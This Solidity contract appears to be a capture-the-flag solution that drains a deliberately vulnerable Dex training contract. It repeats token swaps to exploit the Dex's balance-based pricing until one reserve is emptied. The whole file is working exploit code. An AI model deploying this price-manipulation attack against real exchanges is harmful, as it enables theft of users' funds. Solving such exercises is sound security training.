// SPDX-License-Identifier: MIT
import "../../src/Dex/Dex.sol";
import "forge-std/console.sol";
import "openzeppelin-contracts/utils/math/Math.sol";

pragma solidity ^0.8.0;

contract DexExploit {

    Dex public victim;

    constructor(address payable _victim){
        victim = Dex(_victim);
    }

    function hack() public {
        address token1 = victim.token1();
        address token2 = victim.token2();

        // Approve the Dex to spend our tokens
        IERC20(token1).approve(address(victim), type(uint256).max);
        IERC20(token2).approve(address(victim), type(uint256).max);

        // Swap 1: Swap 10 Token1 for Token2
        victim.swap(token1, token2, 10);

        // Swap 2: Swap the received Token2 for Token1
        victim.swap(token2, token1, 20);

        // Swap 3: Swap the received Token1 for Token2
        victim.swap(token1, token2, 24);

        // Swap 4: Swap the received Token2 for Token1
        victim.swap(token2, token1, 30);

        // Swap 5: Swap the received Token1 for Token2
        victim.swap(token1, token2, 41);

        // Swap 6: Swap the remaining Token2 to drain Dex's Token1
        uint dexToken1Balance = IERC20(token1).balanceOf(address(victim));
        uint dexToken2Balance = IERC20(token2).balanceOf(address(victim));
        uint myToken2Balance = IERC20(token2).balanceOf(address(this));

        uint amount = dexToken2Balance;

        // Ensure we have enough Token2 to swap
        if (amount > myToken2Balance) {
            amount = myToken2Balance;
        }

        victim.swap(token2, token1, amount);
    }

    receive() external payable {
    }
}